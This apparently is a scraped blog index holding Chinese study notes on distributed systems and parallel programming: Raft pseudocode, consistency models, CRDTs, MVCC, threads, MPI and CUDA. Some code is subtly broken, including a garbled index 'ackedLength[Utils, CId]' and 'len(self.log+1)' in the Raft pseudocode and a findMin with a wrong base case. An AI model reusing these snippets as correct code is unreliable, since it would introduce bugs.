    self.sentLength[n], self.ackedLength[n] = len(self.log), 0                    self.copyLogTo(n)        elif vTerm &gt; self.term:            self.Role, self.Term, self.votedFor = &quot;follower&quot;, vTerm, None            __stopElectionTimer()    def broadcast(self, msg):        if self.Role == &quot;leader&quot;:            self.log.append((msg, self.Term))            self.ackedLength[self.id] = len(self.log)            for n in &#123;n in nodes if n is not self&#125;:                self.copyLogTo(n)        else:             __forwarding_to_leader(msg)    def periodically_do(self):        if self.Role == &quot;leader&quot;:            for n in &#123;n in nodes if n is not self&#125;:                self.copyLogTo(n)    def copyLogTo(self, n):        i = self.sentLength[n]        diffLogs = self.log[i:]        prevFollowerTerm = self.log[max(0, i-1)]        __send(n, (&quot;LogRequest&quot;, self.id, self.Term, i, prevFollowerTerm, self.commitLength, diffLogs))        def when_recv_LogRequest(self, lId, lTerm, followerLogStart, followerLogTerm, lCommitLen, diffLogs):        isLargeTerm = lTerm &gt; self.Term        isCandidate = lTerm == self.Term and self.Role == &quot;candidate&quot;        if isLargeTerm or isCandidate:            self.Role, self.Leader = &quot;follower&quot;, lId            if isCandidate:                self.Term, self.votedFor = lTerm, None                largerLog = len(self.log) &gt;= followerLogStart # follower不能比較大，不然就沒有更新的意義了        isFreshStart = followerLogStart == 0        isLogStartInSameTerm = followerLogTerm == self.log[followerLogStart-1].term        logOK = largerLog and (isFreshStart or isLogStartInSameTerm)                if self.Term == lTerm and logOK:            self.patchDiff(followerLogStart, lCommitLen, diffLogs)            ack = len(diffLogs) + followerLogStart            __send(lId, (&quot;LogResponse&quot;, self.id, self.Term, ack, True))        else:            __send(lId, (&quot;LogResponse&quot;, self.id, self.Term, 0, False))    def patchDiff(self, start, lCommitLen, diff):        #shrink log        if diff and len(self.log) &gt; start and self.log[start].term != diff[0].term:            self.log = self.log[:start]                if start+len(diff) &gt; len(self.log):            self.log += diff[len(self.log)-start:]                if lCommitLen &gt; self.commitLength:            for msg,_ in self.log[self.commitLength:lCommitLen]:                __deliver(msg)            self.commitLength = lCommitLen        def when_recv_LogResponse(self, fId, fTerm, ack, good):        if self.Term == fTerm and self.Role == &quot;leader&quot;:            if good and ack &gt;= self.ackedLength[fId]:                self.sentLength[fId] = self.ackedLength[Utils, CId] = ack                self.commitLogEntries()            elif self.sentLength[fId] &gt; 0:                # 太長啦                self.sentLength[fId] -= 1                self.copyLogTo(fId)        elif fTerm &gt; self.Term:            self.Term, self.Role, self.votedFor = fTerm, &quot;follower&quot;, None        def commitLogEntries(self):        acks = lambda l: len(n for n in nodes if self.ackedLength[n] &gt;= l)        newCommitLen = max(&#123;l for l in range(1,len(self.log+1)) if acks(l) &gt;= (len(nodes)+1)//2&#125;, default=-1)                if newCommitLen &gt; self.commitLength and self.log[newCommitLen-1].term == self.Term:            for msg,_ in self.log[self.commitLength:newCommitLen]:                __deliver(msg)            self.commitLength = newCommitLen\nReplica consistency\n\n各種情境下的Consistency\n\nACID\n\nDB在跑完transaction後會從consistent state到另一個consistent state\n\nconsistent: satisfying application-specific invariants\n\n\n\n\nRead-after-write consistency\nReplication: 每個replica都要consistent\n\n同樣狀態? 從什麼時候開始算\nread都要return一樣的結果\n\n\n\n\nAtomic commit\n\nACID的transaction是\n\neither commits or aborts\n\ncommit: 是持久的(後面都看的到)\nabort: 沒有可見的side-effect\n\n\n所以如果很多DB，也是either commits or aborts\n\n\n\nTwo-phase commit\n\n\n\n如果process在等coordinator回commit或是abort之前掛了?\n\n就是等coordinator回來\n\n\n\n\nFault-tolerant two-phase commit\n\n就是傳commit時會帶所有有關的replica\n\n這樣只要有人發現在有關的replica掛了就可以發abort\n\ntotal order broadcast\n\n\n\n\n之後就是等return ok\n\n都ok，commit\n出事，abort\n\n\n\n\n\n\n\n\n\n\nLinearizability (strong consistency)\n\n多node的atomic operation\n\n每個operation的return都是最新的結果\n\n\nnot happens-before\n\n\nset之後的get都要能看到set的結果 (Linearizability)\nclient1與client2沒有send/recv (not happens-before)\n\n所以不能用Lamport clocks!!\n只能用phy clock!!\n\n\nOperations overlapping in time\n\norder沒差，這裡的重點是看的到\n\n\n\n\nSerializability &amp; Linearizability\n\nLinearizability: 都拿到最新的結果 (cache coherense)\nSerializability: 多個transaction同時跑就像是transaction按照某個順序去跑 (mem model)\n\n\n\n\nclient2與client3拿到的結果不對 (not Linearizability)!!\n\n\n\n\n手法\n\nget的linearizability\n\nquorum read\n\n\nset的linearizability\n\nblind write to quorum\n\n\n\n\n\n\nLinearizable compare-and-swap (CAS)\n\ntotal order broadcast\n\n\n\nadvantages\n\n分散式不像分散式\n使用上就變簡單了\n\n\nDownsides\n\nPerformance: 很多msg與一直在等\nScalability: 需要leader\nAvailability: 連不到quorum什麼事都不用做\n\n\n\n\nEventual consistency\n\nThe CAP theorem\n\n在網路會gg的情況下 (network Partition)，只能保證一個\n\nConsistent (linearizable)\n\n等\n\n\nAvailable\n\n不等，直接傳自己的舊資料\n\n\n\n\n\n\n只要沒有進一步的update，所有replica都會變成一樣的state\nStrong eventual consistency\n\nConvergence: 只要是同一個state跑同一集合的update(order沒差)，最後會是一樣的狀態\nEventual delivery: 只要有人被update到，最後所有人都會被update到\n\n\nProperties\n\n不用等\n只要Causal broadcast或以下就可以update\nConcurrent updates =&gt; 只要能處理conflict就沒事\n\n\n\n\n\n\nConcurrency control in applications (152)\n\n\nConflicts due to concurrent updates\n\n\n解法\n\n\nConflict-free Replicated Data Types (CRDTs)\n\n就是有timestamp的dict\n\n\n\n\n作法\n\nOperation-based\n\n傳的是action (set)\n\nreliable broadcast (一定要到，但可以是任何順序)\n\naction(set)一定要commutative\n\n\n\n\ntypically has smaller messages\n\n例子: Operation-based text CRDT\n\n\ninit &amp; read\n\n\n\nelementAt就是array[i]，實作在set上\n\n\n\n\n有一段區間，insert就是二分\n\n\n\n\n\ndelete就是把tuple從state中去掉\n\n\n\n\ncausal broadcast\n\ninsert要在delete之前先到\n\n\n\n\n\n\nState-based\n\n傳的是state (整個values)\n\nbest-effort broadcast (不到沒關係)\n\n原本reliable確保一定會到，但現在沒有\n\nIdempotent\n\n\n剩下就是原本reliable的事\n\nCommutative\n不過現在一次多個 (opration based是一次兩個)\n\nAssociative\n\n\n\n\n\n\n\n\ncan tolerate message loss/duplication\n\n\n\n\n\n\n\n\n\n\n\n\nOperational Transformation (OT)\n\n把operation記錄下來，之後需要重組可以重新組合\n\n\n\n\n\n\n\n\n\n\n\nConsistent snapshots\n\n前面做的事(包含transcation)，後面(包含transcation)看的到\n\nconsistent with causality\n\ntranscation都要consistent with causality\n\nlinearizability depends on real-time order\n\n\n\n把誤差補上\n\n\n\n\n\n\n\n\n\n\n作法: multi-version concurrency control (MVCC)\n\n每一次write都會產生新的版本與相對應的timestamp\nread-only transcation就是一個時間\n\nread時就是取比自己早且最靠近自己的資料\n\n\n\n\n\n\n\nsnapshot of system-wide state\n\nConsistent cuts\n\n區分event的cut\n\n在cut中的event都是happens-before\n\n除了起點:-)，所以是consistent\n\n\n\n\n也就是，在左手邊的event只有兩種\n\nsend\nrecv，同時他的send也在cut(左手邊)中\n\n\n\n\nf只有recv，沒有send在cut中，就不是consistent\n\n\n\n\n收集snapshot of system-wide state\n\n把Consistent cut推到的地方才收集local state\n\nlocal state之後可以集合起來變成global state\n\n\n怎麼代表cut?\n\n用marker msg以causal order去發\n\n收到marker就收集state\n\n但是當初收到marker的channel不用\n\n因為前一個process已經收集過了\n\n\n\n\n\n\n\n\n\n\n\n\n\nRef\nLinearizability versus Serializability\nDistributed Systems (好地方，如果slide不懂還有lecture note)\nLecture 13: Vector clocks, consistent cuts, process groups, and distributed mutual exclusion\n","categories":["System","Distributed"]},{"title":"Parallel Thinking","url":"/2022/01/Parallel/","content":"動機\n平行的思考\n\nConcurrent computing &amp; Parallel computing &amp; Distributed computing\n其實就共用資源、與各個計算單元之間要溝通這件事而言，他們其實差不多\n但如果還是要分的話\nParallelism: 多個core同時跑\nConcurrency: 因為同時/交互執行/節點失敗/節點不可靠所造成的效果(non-determinacy)\n\nParallel computing &amp; Distributed computing\n其實就共用資源、與各個計算單元之間要溝通這件事而言，他們其實差不多\n但Distributed computing更重視HA的部分\n平行化就是在 =&gt; Coordination\n\nCommunication: 傳送結果到其他點\nLoad Balancing: 工作量不能差太大\nSynchronization: 要等其他點到一定程度\n\n用一般演算法的話來說就是D&amp;Q，所以怎麼divide?\nTask-parallelism &amp; Data-parallelism\nTask-parallelism: 各種任務(像新年大掃除有掃廁所、清廚房…)，不同core做\nData-parallelism: 不同core做類似的任務，像多段下載\n目前沒有一個好的方式把serial prog轉成Parallel prog\n所以要自己寫!!\n因為task吃題目，所以這裡只看Data-parallelism\n2 parallel models (+ 1 model)\nmodel的要素\n\nControl\n\n如何達成平行化\noperation之間的怎麼協調執行順序\n\n\nData\n\n那些資料是 private 是 shared\n怎麼存取shraed data\n\n\nSynchronization\n\n有哪些operation\n那些是atomic\n\n\nCost\n\n有什麼成本\n\n\n\nShared Memory\n\nControl\n\n如何達成平行化\n\nthread當成抽象的processor\n可以自由地創thread\n\n\noperation之間的怎麼協調執行順序\n\n讀寫shared memory\n透過Synchronization做協調(coordinate)\n\n\n\n\nData\n\n那些資料是 private 是 shared\n\nprivate: 在thread內的\nshared: 在thread外的\n\n\n怎麼存取shraed data\n\n直接讀寫mem\n\n\n\n\nSynchronization\n\n有哪些operation\n\nSynchronization\n\nsemaphore\nmutex\nbusy-waiting\n\n\n協調\n\ncondition variable\n\n\n\n\n那些是atomic\n\n就是atomic與thread操作\n\n\n\n\nCost\n\n有什麼成本\n\n創thread\ncontext switch\n\n\n\n\n\nRace Condition\n每次跑，結果可能會不同\n優缺點\n\n優點\n\n溝通方式簡單\n\nmem讀寫\n\n\n\n\n缺點\n\n需要Synchronization機制\n不好scale\n處理cache很頭痛 (cache Coherence)\n\n\n\nMessage passing\n\nControl\n\n如何達成平行化\n\n有許多獨立的processor\n\n\noperation之間的怎麼協調執行順序\n\nsend/receive pairs\n\n在溝通時剛好完成協調\n\n\n\n\n\n\nData\n\n那些資料是 private 是 shared\n\nprivate: processor內的資料\n\n\n怎麼存取shraed data\n\n沒有shared data，要透過send/receive pairs\n\n\n\n\nSynchronization\n\n有哪些operation\n\n不用\n\n\n那些是atomic\n\n不用\n\n\n\n\nCost\n\n有什麼成本\n\n溝通時的delay\n\n溝通的方式: 網路, mem\n怎麼接收: poll, interrupt\n\n\n\n\n\n\n\n優缺點\n\n優點\n\n明確溝通\n不用特別為cache頭痛\n\n\n缺點\n\n溝通的成本很高\n不好寫 (??)\n\n\n\nShared Memory &amp; Message passing\n\ncommunication Turing complete\n\n彼此可以互相實作對方的模型\n\n\n\n除了divide，還可以一次處理多一點: Data Parallel\n像是array不是一次處理一個，或是讓thread分別處理每個段\n現在是直接處理整個array!!\nParallel Algo的手法\n\n把任務切出來，讓其他人去做 (Divide-and-conquer)\n讓一次處理的資料變多 (對array之類的collection操作)\nContraction (縮點、上rank)\nRandomization\nIdentifying independent sets\nPointer jumping\n\nparallel primitives\n\nmap\nreduce: reduce, min, max, sum, …\nscan: prefix sum\nfilter\n\n其實是由 map, scan, map構成\n\nmap給的predicate\nscan做prefix sum (counting sort)\n利用 第1步與第2步的array去生array\n\n\n\n\n\n從FP來的，在mapreduce後廣為人知\nParallel Algo的BigO\n\nwork: sequential 跑的時間複雜度 (只有一顆core)\nspan: 如果有很多core跑時，最長的時間複雜度 (有很多顆core)\n\n怎麼樣叫Parallel，怎麼樣叫Sequential\n\nfully Sequential: for (i : range(A)) A[i] = f(A[i-1])\n\n這個span是A\n\n\nfully Parallel: for (i : range(A)) A[i] = f(A[i])\n\n這個span是1\n\n\npartially Parallel: for (i : range(A)) A[i] = f(A[i-sqrt(len(A))])\n\n這個span是sqrt(A)\n\n\n\n\n\n\nspeed-up: work/span\n\n所以實際的時間複雜度 (Tp)，一定介於兩者之間\nwork &lt;= Tp &lt;= span\n之後有個神奇公式，可以求漸近的Tp，P是核心數，\nTp = O(work/P + span)\n這邊可以配合後面的 測量指標(尤其是Amdahl’s Law) 一起看\n例子: findMin on Tree\ndef findMin(root):    if not root:        return float(&#x27;-inf&#x27;)    else:        return min(root.data, findMin(root.left), findMin(root.right))\nwork:\nif n = 1    O(1)else    O(left) + O(right) + O(1)\nspan:\nif n = 1    O(1)else    max(O(left) + O(right)) + O(1)\n所以需要知道實際的input，才知道實際的複雜度\n\nDegenerate Tree(就是list)\n\nwork: O(n)\nspan: O(n)\n\n\nPerfect Tree(平衡樹)\n\nwork: O(n)\nspan: O(log n)\n\n\n\n測量指標\n\nspeedup: serial執行的時間對上Parallel執行的時間 的比率\n\n線性speedup\n\nspeedup 剛好等於 核心數\n也就是隨著核心數上去速度就會上去\n\n\n\n\nefficiency: speedup的比率除上核心數，也就是每個核心促進了多少進步\nscalability: 資料量上升，核心數上升就能讓efficiency不變\n\nStrongly scalable\n\n核心數上升，資料量不變，efficiency不變\n\n\nWeakly scalable\n\n核心數上升，資料量上升，efficiency不變\n\n\n\n\n\n隨著核心數上升，performance可以提升到多少?\nperformance有兩個面向，latency與throughput\ns是serial的比例(就是1-p)，p是parallel的比例(就是1-s)，n是核心數\n兩個面向關注的點不同，\n\n一個是關注能減少多少時間\n\nAmdahl’s Law\n\nspeedup = (s+p) / (s+(p/n)) = 1 / (s+(p/n))\n\nn帶無限，可以得到1/s\n\n\n假設\n\n溝通時沒有成本\n問題大小固定\n\n\n\n\n\n\n一個看能多處理多少工作\n\nGustafson’s Law\n\n(s+n*p) / (s+p) = (1-p)+n*np = 1+(n-1)*p\n假設\n\n處理時間固定\n\n\n\n\n\n\n\n到處都是平行化\nprocessor\nInstruction Level Parallelism (ILP)\n\n讓一次處理的資料變多\n\n指令 (把指令想像成一條長帶子)\n\n把帶子空隙填滿: 總throughput不變，latency變小\n\nOut of Order Execution\n\nstall時跑指令\nOut-of-order execution =&gt; out-of-order completion\n\n\nPipelining\n\n把工作流程分段\n各種harzard\n\nStructural hazards: 同時想用同一個phase\nData hazards\n\nRead-after-write: 完成寫入前讀值\n\n沒辦法在不犧牲latency的方式下處理\n處理方式\n\nstall\n\n\n\n\nWrite-after-read: 完成讀值前寫入\nWrite-after-write: 完成第一個寫入前寫入\n\n處理方式\n\nooo execution\n\nregister renaming\n\n\nforwarding (cps)\n\n\n\n\n\n\nControl hazards\n猜、猜、猜\n\nSpeculative Execution\n猜 分支、指令相依性、數字\n猜錯要整個重來\n\n\n\n\n\n\n\n\n把帶子疊到帶子上(1 x n到2 x 0.5n): 總throughput變大，latency變小\n\nSuperscalar: 可以同時跑很多指令\n\n原本是scalar，也就是只操作一條指令/資料單位\n\n\nVLIW (Very Long Instruction Word): 把沒有相關的指令包在一起跑\n\n由compiler指定什麼指令可以一起跑\n\n\n\n\n\n\n資料\n\nVector Processing/SIMD (Single Instruction Multiple Data)\n\n以array為單位去操作了 (原本是一次一個，做好幾次)\nprogrammer要自己寫，compiler或是cpu不會自己轉換\nMultimedia Extensions\n\n把一部分的reg當成array\n\n像把32 bits的reg當成兩個16 bits的array\n\n\n\n\n\n\n\n\n\n\n\nSuperscalar &amp; VLIW\n與Superscalar差在compiler的輸出，一個是parralel，一個是serial code\n\n\n所以VLIW compiler需要做binder把call分配到下面的執行單元，Superscalar是留給硬體\n\n\nThread-Level Parallelism (TLP)\n\nthread origin\n\nreal processor\n\nHardware\n\n\nillusion: 在某個時間後就切到另一個thread\n\nHardware\nOS\nuser-level (PL的library)\n\n\n\n\nthread creation\n\ncobegin/coend: 這塊(procedure)可以平行的跑\nfork/join: fork出去的(procedure或function)會平行的跑\nfuture: 這段code(expression)會平行的跑\n\n\nthread Scheduling\n\n底層決定他什麼時候跑 (thread switch)\n\nfine grain: thread主動交棒\ncoarse grain: thread stall, 其他thread可以跑 等等\n\n\n可以指定affinity\n或是用user-level thread\n\n\ntoo many thread!\n\n創thread要$$\n\nmem\ncpu的cycle\n\n\nSol\n\nthread pool或是固定thread數量\n復用main thread\n\nbefore: A.fork(); B.fork(); A.join(); B.join();\nafter: A.fork(); B.run(); A.join();\n\n\n\n\n\n\n\nTLP + ILP\n把TLP的thread當成填充ILP發生stall的指令來源\nsummary\n\nMemory System\n\n與cpu相比，ram的速度太慢了!!\n\nLocality\n\n8/2法則: 最常用到的只有一點點\n\n從古至今，hardware依舊靠locality加速\n\n\nTemporal Locality (Locality in Time)\n\nloop\n\n\nSpatial Locality (Locality in Space)\n\narray\n\n\n\n\nMemory Hierarchy\n\n越慢的放越遠\n\n\n\n\n\nhardware Architecture\n把多個處理單元放在一起，一起處理問題\n\n重點是?\n\n資源分配\n\n有什麼處理單元? cpu? gpu?\n多少mem\n\n\ncommunication的成本\n\nData access, Communication and Synchronization\n從Power與latency (所有效能面向)，communication是最貴的部分\n\n\n\n\nArchitecture的分類\n\nSingle-instruction single-data (SISD)\nSingle-instruction multiple-data (SIMD)\nMultiple-instruction multiple-data (MIMD)\nMultiple-instruction single-data (MISD)\n\n\n\n總的來說\n\n\n\n\n\nShared-memory Architectures\n\n任何cpu都能access到任何mem\n透過mem操作溝通\n兩種類型\n\n\nUniform Memory Access\n\nSymmetric Multiprocessor (SMP)\nCache Coherence\n\n每個cpu都有自己的cache\n如果有人改到mem的值，其他cache怎麼辦\n\n\n\n\nSol: Coherence Protocol\n\n去invalidate其他cache\n\n\n\n\n\n\n\nNon-Uniform Memory Access\n\nDistributed shared memory\n\n所以access到mem的時間會有所不同!!\n\nCoherence not Enough!!\n\n傳輸有delay的話…\n\n\n\nSol: Memory Consistency Model\n\n執行某個記憶體操作，誰看的到這個改動\nSequential Consistency\n\n每個指令都是atomic!!\n\n\n還有其他的，在介紹lockfree時再提\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCoherence &amp; Consistency\n\nCoherence\n\nread會拿到什麼值\n\n別人寫了，(cache)拿到的值是不是對的\n\n\nbehavior to same location\n\n\nConsistency\n\n什麼時候會拿到寫入的值\n\n寫之後，要一直read到某一次或是第一次之後才會看到\n\n\nbehavior to other locations\n\n\n\nDistributed-memory Architectures\n\nprocessor有自己的mem\nmem不與其他人共享\n\n\nsoftware Programming\nShared-Memory Model\n\n變數(mem)分成shared與private\nExplicit v.s. Implicit Threads Programming\n\nExplicit: pthread\n\n創thread\n\n用API創\nprogrammer創thread與管理thread\n\n\n分配工作\n\nprogrammer自己寫\n\n\nsync (等待thread完成)\n\n手動join\n\n\n\n\nImplicit: openMP\n\n創thread\n\n用directives\nruntime創thread與管理thread\n\n\n分配工作\n\n用directives\n\n\nsync (等待thread完成)\n\n在區塊結束的地方等\n\n\n\n\n\n\nNondeterminism: race condition\n\nmutex\nbusy-waiting\nsemaphore\nTransactional memory\n\n\nThread Safety\n\nserial function在multi-thread能不能正常跑\n反例: strtok\n\n他有static去存目前string處理到哪邊，如果被多thread call…\n\n\n\n\n\nDistributed-Memory Model\n\nprocess有自己的mem\nmem不與其他人共享\n各個process之間有rank作類似addr的功用\n有另外的超能力\n\nBroadcast: 把val推到其他process\nReduction: 把其他process的output整合\n\n\nOne-Sided Communication\n\n只更新一個mem的值\n\n跟新local，from remote process\n跟新remote，from local process\n\n\n\n\n\nProgramming Hybrid Systems\n\nPartitioned Global Address Space Languages\n\nallow the user to use some shared-memory techniques\n\nfor programming distributed-memory hardware\n\n\n跨local的mem access十分慢!!\n\n\n\nShared memory programing\n3 synchronization scenarios\ncritical section\n多thread共同修改某一變數，就是critical section\nBusy-waiting\n\n可能是reorder的受害者  y = f(id)while (flag != id) ;x += yflag++// ordery = f(id)x += ywhile (flag != id) ;flag++\n\n會把一顆cpu吃掉 (spin lock)\n\nmutex\n就是mutex，在real time可以有priority promotion處理priority inversion\nSemaphore\nacc就是還有多少個空位的意思\n原本: acc + queue\nposix: acc\nSemaphores vs Mutexes\nSemaphore不管ownership，只要有人call semaphore，semaphore就會變\nProducer-Consumer Synchronization (no critical section)\n\n沒有critical section\n\nNo competition synchronization\n為了合作而synchronization (Cooperation synchronization)\n\n\n\nbarrier\n要所有thread在同一時間啟動(或是停在同一個點)\n像是debug或是計時會用到\n用busy-waiting與mutex\nmutex.lock()acc += 1mutex.unlock()while acc &lt; cnt_of_threads:    pass\n\n吃爆cpu(busy waiting)\n怎麼做第2個barrier?\n\nreset acc? 要考慮有沒有reset acc對\n\n\n\n用Semaphores\n一個數有幾個process (count_sem, 1) (其實應該可以用atomic)\n一個數負責停下process (barrier_sem, 0)\nsem_wait(&amp;count_sem);if (counter == thread_count−1) &#123;    counter = 0;    sem_post(&amp;count_sem);    for (j = 0; j &lt; thread_count−1; j++)        sem_post(&amp;barrier_sem);&#125; else &#123;    counter++;    sem_post(&amp;count_sem);    sem_wait(&amp;barrier_sem);&#125; \n用condition variable\npthread_mutex_lock(&amp;mutex);counter++;if (counter == thread_count) &#123;    counter = 0;    pthread_cond_broadcast(&amp;cond_var);&#125; else &#123;    pthread_cond_wait(&amp;cond_var, &amp;mutex) ;&#125;pthread_mutex_unlock(&amp;mutex);\nlock其實很貴\n假設要做一個multi-thread的linked list\n\n所有動作用lock包\n\n那根本就是serial\n\n\n每個node放lock\n\nlock要空間!!\n實作十分複雜\n明明只要read卻還要跟別人搶lock!?\n\n所以這個效能是所有case中最爛的\n\n\n\n\nread-write lock\n\n可以與1一樣但是read的成本變小了\n\nwrite多，總體效果與1一樣\nread多，效果比1好\n\n\n還可以保護write\n\n\n\n關於cache\ncache miss\nvoid *Pth_mat_vect(void* rank) &#123;    ...    for (i = my_first_row; i &lt;= my_last_row; i++) &#123;        y[i] = 0.0; // HERE        for (j = 0; j &lt; n; j++)            y[i] += A[i*n+j]*x[j]; // HERE    &#125;    return NULL;&#125; /* Pth_mat_vect */\ncacheline是64 bytes\n\n如果y的範圍太大，寫入會失敗 (write-misses)\n如果x的範圍太大，寫入會失敗 (read-misses)\n\nfalse sharing\n假設上面程式的y，剛好可以都放入cacheline，但是只要cacheline的值被某個thread改變，其他thread要access資料時cacheline就要重拿資料(Cache Coherence)，而這邊明明都是y，如果一直有thread寫資料…\n所以可以想見，cacheline會一直重拿，但是明明大部分的cache(y)是對的!!\n另一個情況是task上編號(rank)，這樣在shared mem中就不會衝突，但因為false sharing就算把thread加上去，效能也沒有隨之變好\n\n加padding把cacheline塞滿\n\nsum[id][pad]\n\n\n用syncronization包成一個變數!!\n\natomic_int sum\n\n\n\nReordering Memory\n\n\n再一次，memory consistency model\n\nsequentially consistent\n\nprogram order == code order == commit order\n\n\nRelaxed Consistency\n\n把指令分成\n\ndata(write, read)\n\n不保證順序\n\n\nsync (mem barrier, volatile, atomic, fork/join…)\n\n保證順序!!\n\nS -&gt; S\nS -&gt; W/R\nW/R -&gt; S\n\n\nmem barrier (在openMP叫flush)\n\nflush之前的變數(在flush有用到的部分)會被commit (所以flush中一定看的到)\n\nread mem barrier\n\n\nflush之後的變數(在flush有用到的部分)，會看到在flush中做出的結果\n\nwrite mem barrier\n\n\nflush中不會reorder\n\n\n\n\n\n\n\n\n\n\n\n單論Synchronization\n\n我們的敵人\n\nrace condition: 泛指跑好幾次可能出現不同的結果\n\ndata race: 對同一個變數修改\n\n\nreorder (講義叫Bad interleavings)\n\na = 1; b = 2 與 b = 2; a = 1;\n\n在compiler或是cpu眼中是可以reorder的!!\n\n看arch的規定\n\n\n\n\n\n\n\n\n工具\n\n保持Atomicity (critical section)\n\nmutex，但有很多細節\n\n\n\n\n新的敵人\n\ndeadlock\n\nDining Philosophers (為lock上順序!!)\n\n\nTime-Of-Check-To-Time-Of-Use\n\nif (checkA()) &#123; execA(); &#125;\n有人在checkA成功後，到執行execA之前，被其他thread做到事的話…\n\n換言之，if的block中，不能信任有確認過的條件了\n\n\n\n\n\n\n解法\n\nThread-Local Memory\n\n不用share的資料就copy\n\n\nImmutable Memory\n\n沒有write，沒有race condition或是data race\n\n\n但我真的需要改 (要用mutex了qq)\n\nUse Consistent Locking\n\n用同樣的lock到所有有關的地方\n好好記錄為什麼需要這個lock\n用lock去割出 shared-and-mutable locations\n\nlock-oriented\n\n\n\n\nStart With Fewer Locks (Coarse-Grained)\n\n除非contention太嚴重才讓lock變多 (Fine-Grained)\n\n\nKeep Critical Sections Small\n\nCritical Sections太長: 效能差\nCritical Sections太短: race condition (可以看到中間狀態)\n\n\nThink About Atomicity\n\n想想什麼動作應該放在一起\n\n像Time-Of-Check-To-Time-Of-Use\n不是data race也不是race condition\n但就是出事，所以應該把if與動作綁在一起\n\n\n\n\nUse Libraries\n\n\n\n\n\n\nMessage passing programing\nPoint to Point Communication\nCommunication透過recv與send執行\nmessage會傳\n\nsender的rank\nreceiver的rank\ncommunicator (MPI的網路)\ntag: 使用者指定的tag\ndata\n\n下面是standard 的傳送方式\nsender buf --&#123;copy&#125;--&gt; system buffer --&#123;network&#125;--&gt; system buffer --&#123;copy&#125;--&gt; receiver buf\ncommunication modes\nblocking\nblocking的理由是\n\n\n等handshake\n\nSynchronous\n\n\n\n等copy\n\n所有類型都要等\n從sender buffer 到 receiver buffer\n\nSynchronous\nReady\n\n\n從sender buffer 到 對面的system buffer 到 receiver buffer\n\nStandard(資料小)\n\n\n從sender buffer 到 自己指定的 buffer 到 receiver buffer\n\nBuffered\n\n\n\n\n\n沒copy到別的buffer (sender buf =&gt; receiver buf)\n\nSynchronous: 一般的tcp\n\nssend送msg到recv說我要傳，之後等\nrecv送msg，之後等\nhandshake好了，可以送了，兩邊等到完成\n\n\n\n\n\nReady: 類似reverse tunnel\n\nrecv送msg，之後等\nrsend看有沒有recv的msg，有，開送，兩邊等到完成；沒有，報錯退出\n\n\n\n\n\n\n\n\ncopy到別的buffer\n\nBuffered: 先copy到自己指定的mem (in sender)\n\nbsend把資料copy到自己指定的mem，copy完退出\n收到recv的msg，開送\n\n\n\n\n\nStandard:\n\n資料小: copy到system buffer (in receiver)\n\nsend把資料送到對面的system buffer，等到送完\nrecv直接從system buffer copy到receiver buf，等到copy完\n\n\n\n\n\n資料大: 就變成Synchronous\n\n\n\n\n\n\n\n\n\nnon-blocking\n\nisend會開始送，但是不會等，馬上return\n\n用test看目前狀態，wait去等他完成\n\n\nirecv如果好了就會收，但是不會等，馬上return\n\n用test看目前狀態，wait去等他完成\n\n\n\n剩下就是Standard(資料小)\n\n可以想像成傳資料時開thread!!\ndeadlock (對，還是有)\nsend 與 recv 要成對出現\nif (rank == 0) &#123;    err = MPI_Send(sendbuf, count, datatype, 1, tag, comm);    err = MPI_Recv(recvbuf, count, datatype, 1, tag, comm, &amp;status);&#125;else &#123;    err = MPI_Send(sendbuf, count, datatype, 0, tag, comm);    err = MPI_Recv(recvbuf, count, datatype, 0, tag, comm, &amp;status);&#125;\n解法: swap\nif (rank == 0) &#123;    err = MPI_Send(sendbuf, count, datatype, 1, tag, comm);    err = MPI_Recv(recvbuf, count, datatype, 1, tag, comm, &amp;status);&#125;else &#123;    err = MPI_Recv(recvbuf, count, datatype, 0, tag, comm, &amp;status);    err = MPI_Send(sendbuf, count, datatype, 0, tag, comm);&#125;\n解法: non-blocking\nif (rank == 0) &#123;    err = MPI_Isend(sendbuf, count, datatype, 1, tag, comm, &amp;req);    err = MPI_Irecv(recvbuf, count, datatype, 1, tag, comm);    err = MPI_Wait(req, &amp;status);&#125;else &#123;    err = MPI_Isend(sendbuf, count, datatype, 0, tag, comm, &amp;req);    err = MPI_Irecv(recvbuf, count, datatype, 0, tag, comm);    err = MPI_Wait(req, &amp;status);&#125;\nCUDA\n\ncpu vs gpu\n\n\n\n\n\n\ncpu: Latency\n\n大cache\n\n降低mem延遲\n\n\n複雜的control邏輯\n\nbranch prediction\ndata forwarding\n\n\n計算能力(ALU)強\n\n降低operation延遲\n\n\n在sequential code快\n\n\n\n\ngpu: Throughput\n\n小cache\n\n增加mem的throughput\n\n\n簡易的control邏輯\n\nNO branch prediction\nNO data forwarding\n\n\n計算能力(ALU)弱(省能源)\n\n延遲高，但是可以pipeline達成高throughput\n\n所以有很多thread\n\n\n\n\n在parallel code快\n\n\n\n\ngpu\n下面是gpu在arch上的特點\n\n\n\n\n\nCUDA: Parallel Computing Platform\n\n\nCUDA: Heterogeneous Programming\n\n\n\ngpu叫device\n控制的cpu叫host\n各自有自己的mem，而跑在device上的function(thread)叫kernel\n\n\n\nThread Hierarchies\ngrid有很多block，block(wrap)有很多thread，block中的thread可以共享資料，也同時啟動(迴避掉sync的問題)，跑同一個指令\n不同block的thread不能合作，同時以wrap為單位做schedule\nAt any time, only one of the warps is executed by SM\n\nThread Synchronization\n\n可以用 __syncthreads創barrier\natomic\n\nMemory Model\n\n\nlockfree\n無論當前處於什麼狀態，只要運行足夠長的時間，至少有一個 process 能取得進展或完成其操作\n像是Real-time的狀況，有mutex就有可能發生priority inversion\n或是說，絕對不可能會有deadlock程式，也就是沒有lock的程式\n作法\n如果不能lock，就只能busy-waiting(或是cpu有特別指令)\n做test-and-set，fetch-and-add，compare-and-swap，來確認改之前與改之後的值一不一樣，一樣就寫，不一樣繼續等\n少了lock之後\nlock有一個很重要的性質，他是memory model的sync指令，所以不會被reorder\n但現在不能用lock，所以要注意兩個東西\n\ncpu的memory model\n\n不同架構的cpu在不同case會做reorder的case不一樣\nWeak vs. Strong Memory Models\n\n\n怎麼下memory barrier (Acquire and Release Semantics)\n\n得自己把不能reorder的範圍畫出來\nAcquire and Release Semantics\n\n有些programming language有提供memory model!!\n\n可以不用直接調用memory barrier，改用volatile\n\n謝謝JAVA\n我之前的記憶體模型筆記\n\n\nThe Happens-Before Relation\nThe Synchronizes-With Relation\n\n\n\n\n\n\n\nABA問題\n前面是看值一樣就當成沒改，但這是把資料與時間兩件式混在一起，所以有了ABA，也就是看起來沒換，但其實被人換過，只是資料剛好長的一樣\n所以要多一個變數紀錄時間，有改就要遞增；與read-write 